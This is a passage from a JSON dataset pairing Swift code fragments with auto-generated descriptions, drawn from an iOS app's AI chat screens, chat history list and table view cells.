    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Load recent chat sessions\nloadRecentSessions()\n}\n\n// MARK: - ViewControllerRefreshable Protocol Implementation\n\noverride func refreshContent() {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2229",
    "code": "override func refreshContent() {\n// Reload data when tab is selected to refresh content\nloadRecentSessions()\n}\n\n// MARK: - UI Setup\n\nprivate func setupUI() {",
    "nl": "MARK: - ViewControllerRefreshable Protocol Implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2230",
    "code": "private func setupUI() {\nview.backgroundColor = .systemBackground\n\n// Welcome label\nwelcomeLabel.text = \"AI Assistant\"\nwelcomeLabel.font = UIFont.systemFont(ofSize: 24, weight: .bold)\nwelcomeLabel.textAlignment = .center\nwelcomeLabel.textColor = .label\n\n// Start chat button",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2231",
    "code": "private func configureNavigationBar() {\nnavigationItem.title = \"AI Assistant\"\nnavigationController?.navigationBar.prefersLargeTitles = true\n}\n\nprivate func setupTableView() {",
    "nl": "Function configureNavigationBar - implements configurenavigationbar functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2232",
    "code": "private func setupTableView() {\nrecentChatsTableView.dataSource = self\nrecentChatsTableView.delegate = self\nrecentChatsTableView.register(UITableViewCell.self, forCellReuseIdentifier: \"ChatSessionCell\")\nrecentChatsTableView.backgroundColor = UIColor.systemGroupedBackground\nrecentChatsTableView.separatorStyle = UITableViewCell.SeparatorStyle.singleLine\nrecentChatsTableView.tableFooterView = UIView()\n}\n\nprivate func setupEmptyState() {",
    "nl": "Function setupTableView - sets uptableview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2233",
    "code": "private func setupEmptyState() {\n// Create empty state view\nlet imageView = UIImageView(image: UIImage(systemName: \"bubble.left.and.bubble.right\"))\nimageView.tintColor = .systemGray3\nimageView.contentMode = .scaleAspectFit\n\nlet label = UILabel()\nlabel.text = \"No recent chats\"\nlabel.textAlignment = .center\nlabel.font = UIFont.systemFont(ofSize: 16, weight: .medium)",
    "nl": "Function setupEmptyState - sets upemptystate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2234",
    "code": "private func loadRecentSessions() {\n// Load recent chat sessions from CoreData\n// Fetch up to 20 recent sessions\nrecentSessions = CoreDataManager.shared.fetchRecentChatSessions(limit: 20)\n\nDispatchQueue.main.async { [weak self] in",
    "nl": "MARK: - Data Loading",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2235",
    "code": "@objc private func startNewChat() {\n// Create a new chat session\ndo {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2236",
    "code": "extension AIViewController: UITableViewDataSource {\nfunc tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2237",
    "code": "func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {\nreturn recentSessions.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2238",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"ChatSessionCell\", for: indexPath)\n\n// Configure cell\nlet session = recentSessions[indexPath.row]\n\n// Use modern cell configuration if available\nif #available(iOS 14.0, *) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2239",
    "code": "func tableView(_ tableView: UITableView, titleForHeaderInSection section: Int) -> String? {\nreturn recentSessions.isEmpty ? nil : \"Recent Chats\"\n}\n}\n\n// MARK: - UITableViewDelegate\n\nextension AIViewController: UITableViewDelegate {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2240",
    "code": "extension AIViewController: UITableViewDelegate {\nfunc tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2241",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\n// Get selected session\nlet session = recentSessions[indexPath.row]\n\n// Present chat view controller with this session\nlet chatVC = ChatViewController(session: session)\n\n// Set dismiss handler to refresh the list",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2242",
    "code": "func tableView(_ tableView: UITableView, commit editingStyle: UITableViewCell.EditingStyle, forRowAt indexPath: IndexPath) {\nif editingStyle == .delete {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2243",
    "code": "extension ChatViewController {\n/// Record an AI interaction for learning\nfunc recordAIInteraction(userMessage: String, aiResponse: String, messageId: String) {",
    "nl": "MARK: - AI Learning Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift",
    "code_type": "extension"
  },
  {
    "id": "2244",
    "code": "func recordAIInteraction(userMessage: String, aiResponse: String, messageId: String) {\n// Extract intent and confidence\nlet intent = extractIntent(from: aiResponse)\nlet confidence = extractConfidence(from: aiResponse)\n\n// Record the interaction\nAILearningManager.shared.recordInteraction(\nuserMessage: userMessage,\naiResponse: aiResponse,\nintent: intent,",
    "nl": "/ Record an AI interaction for learning",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "2245",
    "code": "private func extractIntent(from response: String) -> String {\n// Look for intent in square brackets like [navigate to:settings]\nif let range = response.range(of: \"\\\\[([a-zA-Z0-9_\\\\s]+):.*?\\\\]\", options: .regularExpression) {",
    "nl": "/ Extract intent from AI response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "2246",
    "code": "private func extractConfidence(from _: String) -> Double {\n// In a real implementation, confidence could be embedded in response or derived from context\nreturn 0.85 // Default reasonable confidence\n}\n\n/// Show feedback prompt for AI response\nprivate func showFeedbackPrompt(for messageId: String) {",
    "nl": "/ Extract confidence score (placeholder implementation)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "2247",
    "code": "private func showFeedbackPrompt(for messageId: String) {\n// Only show if learning is enabled\nguard AILearningManager.shared.isLearningEnabled else { return }",
    "nl": "/ Show feedback prompt for AI response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "2248",
    "code": "private func showThankYouToast() {\nlet toast = UILabel()\ntoast.text = \"Thanks for your feedback!\"\ntoast.backgroundColor = .systemGray6\ntoast.textAlignment = .center\ntoast.alpha = 0\ntoast.layer.cornerRadius = 10\ntoast.clipsToBounds = true\ntoast.padding = UIEdgeInsets(top: 8, left: 16, bottom: 8, right: 16)\ntoast.translatesAutoresizingMaskIntoConstraints = false",
    "nl": "/ Show a thank you toast message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "2249",
    "code": "class ChatViewController: UIViewController, UITableViewDataSource, UITableViewDelegate,\nUISheetPresentationControllerDelegate\n{",
    "nl": "class ChatViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2250",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\nloadMessages()\n\n// Register for app background/foreground notifications\nsetupAppStateObservers()\n\n// Add a welcome message if this is a new session\nif messages.isEmpty {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2251",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Set navigation bar appearance\nif let navigationController = navigationController {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2252",
    "code": "override func viewDidDisappear(_ animated: Bool) {\nsuper.viewDidDisappear(animated)\n\n// If we're being dismissed (not just covered by another VC), call the dismissHandler\nif isBeingDismissed || navigationController?.isBeingDismissed == true {",
    "nl": "Function viewDidDisappear - implements viewdiddisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2253",
    "code": "private func addWelcomeMessage() {\ndo {",
    "nl": "MARK: - Welcome Message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2254",
    "code": "private func setupAppStateObservers() {\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(appDidEnterBackground),\nname: UIApplication.didEnterBackgroundNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(\nself,",
    "nl": "MARK: - App State Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2255",
    "code": "@objc private func appDidEnterBackground() {\n// Save any pending state when app goes to background\nDebug.shared.log(message: \"Chat view controller saving state before background\", type: .debug)\n\n// Cancel any ongoing message processing\nif isProcessingMessage {",
    "nl": "Function appDidEnterBackground - implements appdidenterbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2256",
    "code": "@objc private func appWillEnterForeground() {\n// Refresh data when app comes to foreground\nDebug.shared.log(message: \"Chat view controller becoming active after background\", type: .debug)\n\n// Refresh messages to ensure we're in sync with CoreData\nDispatchQueue.main.async { [weak self] in",
    "nl": "Function appWillEnterForeground - implements appwillenterforeground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2257",
    "code": "private func setupUI() {\nview.backgroundColor = .systemBackground\n\n// Navigation bar\nnavigationItem.title = currentSession.title\nnavigationItem.leftBarButtonItem = UIBarButtonItem(\nimage: UIImage(systemName: \"clock.arrow.circlepath\"),\nstyle: .plain,\ntarget: self,\naction: #selector(showHistory)",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2258",
    "code": "private func setupTableView() {\ntableView.dataSource = self\ntableView.delegate = self\n\n// Register cell types\ntableView.register(UserMessageCell.self, forCellReuseIdentifier: \"UserCell\")\ntableView.register(AIMessageCell.self, forCellReuseIdentifier: \"AICell\")\ntableView.register(SystemMessageCell.self, forCellReuseIdentifier: \"SystemCell\")\n\n// Configure tableView appearance",
    "nl": "Function setupTableView - sets uptableview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2259",
    "code": "private func setupEmptyStateView() {\n// Create an empty state view\nlet emptyView = UIView()\nemptyView.isHidden = true\nemptyView.backgroundColor = .clear\n\n// Add animation for empty state using SF Symbol\nlet animationView = emptyView.addAnimatedIcon(\nsystemName: \"ellipsis.bubble\",\ntintColor: .systemBlue,",
    "nl": "Function setupEmptyStateView - sets upemptystateview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2260",
    "code": "@objc private func refreshMessages() {\n// Reload messages from database\nloadMessages()\n\n// End refreshing\ntableView.refreshControl?.endRefreshing()\n}\n\n// Update UI when message processing state changes\nprivate func updateProcessingState(isProcessing: Bool) {",
    "nl": "Function refreshMessages - implements refreshmessages functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2261",
    "code": "private func updateProcessingState(isProcessing: Bool) {\nif isProcessing {",
    "nl": "Update UI when message processing state changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2262",
    "code": "private func setupInputControls() {\n// Input container with enhanced styling\ninputContainer.backgroundColor = .systemBackground\ninputContainer.applyCardStyling(\ncornerRadius: 12,\nshadowOpacity: 0.15,\nbackgroundColor: .systemBackground\n)\nview.addSubview(inputContainer)\n",
    "nl": "Function setupInputControls - sets upinputcontrols",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2263",
    "code": "private func setupConstraints() {\n// Enable autolayout\ntableView.translatesAutoresizingMaskIntoConstraints = false\ninputContainer.translatesAutoresizingMaskIntoConstraints = false\ntextField.translatesAutoresizingMaskIntoConstraints = false\nsendButton.translatesAutoresizingMaskIntoConstraints = false\nactivityIndicator.translatesAutoresizingMaskIntoConstraints = false\n\n// Safe area guide for proper layout\nlet safeArea = view.safeAreaLayoutGuide",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2264",
    "code": "private func setupKeyboardHandling() {\n// Add keyboard notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(keyboardWillShow),\nname: UIResponder.keyboardWillShowNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(",
    "nl": "Function setupKeyboardHandling - sets upkeyboardhandling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2265",
    "code": "@objc private func dismissKeyboard() {\nview.endEditing(true)\n}\n\n@objc private func keyboardWillShow(notification: NSNotification) {",
    "nl": "Function dismissKeyboard - implements dismisskeyboard functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2266",
    "code": "@objc private func keyboardWillShow(notification: NSNotification) {\nguard let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,\nlet duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double\nelse {",
    "nl": "Function keyboardWillShow - implements keyboardwillshow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2267",
    "code": "@objc private func keyboardWillHide(notification: NSNotification) {\nguard let duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double else {",
    "nl": "Function keyboardWillHide - implements keyboardwillhide functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2268",
    "code": "private func loadMessages() {\n// Fetch messages from CoreData\nlet fetchedMessages = CoreDataManager.shared.getMessages(for: currentSession)\n\n// Handle the case where no messages are found\nif fetchedMessages.isEmpty && messages.isEmpty {",
    "nl": "MARK: - Data Loading",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2269",
    "code": "private func scrollToBottom(animated: Bool = true) {\n// Ensure we have messages and the table view is loaded\nif !messages.isEmpty && tableView.window != nil {",
    "nl": "Function scrollToBottom - implements scrolltobottom functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2270",
    "code": "@objc private func showHistory() {\nlet historyVC = ChatHistoryViewController()\nhistoryVC.didSelectSession = { [weak self] session in",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2271",
    "code": "@objc private func newChat() {\n// If already processing a message, don't allow creating a new chat\nif isProcessingMessage {",
    "nl": "Function newChat - implements newchat functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2272",
    "code": "func loadSession(_ session: ChatSession) {\nif isProcessingMessage {",
    "nl": "/ Load a different chat session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2273",
    "code": "@objc private func sendMessage() {\n// Ensure we're not already processing a message\nif isProcessingMessage {",
    "nl": "Function sendMessage - implements sendmessage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2274",
    "code": "private func handleMessageProcessingTimeout() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Handle timeout of message processing (e.g., when app is backgrounded for too long)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2275",
    "code": "private func processCommands(from response: String) {\n// Extract commands using regex\nlet commands = extractCommands(from: response)\n\n// Process each command\nfor (command, parameter) in commands {",
    "nl": "MARK: - Command Processing / Process commands extracted from AI response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2276",
    "code": "private func extractCommands(from text: String) -> [(command: String, parameter: String)] {\nlet pattern = \"\\\\[([^:]+):([^\\\\]]+)\\\\]\"\ndo {",
    "nl": "Extract commands from AI response text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2277",
    "code": "private func showErrorAlert(message: String) {\nlet alert = UIAlertController(\ntitle: \"Error\",\nmessage: message,\npreferredStyle: .alert\n)\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\n\n// Check if we can present the alert\nif !isBeingDismissed && !isBeingPresented && presentedViewController == nil {",
    "nl": "MARK: - Error Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2278",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn messages.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2279",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard indexPath.row < messages.count else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2280",
    "code": "func presentationControllerDidDismiss(_: UIPresentationController) {\ndismissHandler?()\n}\n}\n\n// MARK: - UITextFieldDelegate\n\nextension ChatViewController: UITextFieldDelegate {",
    "nl": "MARK: - UISheetPresentationControllerDelegate Handle sheet dismissal properly",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2281",
    "code": "extension ChatViewController: UITextFieldDelegate {\nfunc textFieldShouldReturn(_: UITextField) -> Bool {",
    "nl": "MARK: - UITextFieldDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2282",
    "code": "func textFieldShouldReturn(_: UITextField) -> Bool {\nsendMessage()\nreturn true\n}\n}\n",
    "nl": "Function textFieldShouldReturn - implements textfieldshouldreturn functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/ChatViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2283",
    "code": "class ChatHistoryViewController: UITableViewController {\nprivate var sessions: [ChatSession] = []\nvar didSelectSession: ((ChatSession) -> Void)?\n\noverride func viewDidLoad() {",
    "nl": "class ChatHistoryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2284",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\ntitle = \"Chat History\"\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\nbarButtonSystemItem: .done,\ntarget: self,\naction: #selector(dismissVC)\n)\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"Cell\")\ntableView.backgroundColor = .systemGray6",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2285",
    "code": "@objc private func dismissVC() {\ndismiss(animated: true)\n}\n\nprivate func loadSessions() {",
    "nl": "Function dismissVC - implements dismissvc functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2286",
    "code": "private func loadSessions() {\nsessions = CoreDataManager.shared.getChatSessions()\ntableView.reloadData()\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "Function loadSessions - implements loadsessions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2287",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn sessions.count\n}\n\noverride func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2288",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"Cell\", for: indexPath)\nlet session = sessions[indexPath.row]\ncell.textLabel?.text = session.title\ncell.backgroundColor = .systemBackground\ncell.accessoryType = .disclosureIndicator\nreturn cell\n}\n\noverride func tableView(_: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2289",
    "code": "override func tableView(_: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet session = sessions[indexPath.row]\ndidSelectSession?(session)\ndismiss(animated: true)\n}\n}\n",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/History/ChatHistoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2290",
    "code": "class AppsTableViewCell: UITableViewCell {\nlet nameLabel: UILabel = {",
    "nl": "class AppsTableViewCell - implements functionality related to apps table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2291",
    "code": "private func setupViews() {\ncontentView.addSubview(nameLabel)\ncontentView.addSubview(versionLabel)\ncontentView.addSubview(pillsStackView)\nimageView?.translatesAutoresizingMaskIntoConstraints = true\n\n// Apply modern card styling to the cell\ncontentView.applyCardStyle(\nbackgroundColor: UIColor.systemBackground,\ncornerRadius: 12,",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2292",
    "code": "override func setHighlighted(_ highlighted: Bool, animated: Bool) {\nsuper.setHighlighted(highlighted, animated: animated)\n\nif animated {",
    "nl": "Add touch feedback animations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2293",
    "code": "override func setSelected(_ selected: Bool, animated: Bool) {\nsuper.setSelected(selected, animated: animated)\n\nif animated {",
    "nl": "Function setSelected - sets selected",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2294",
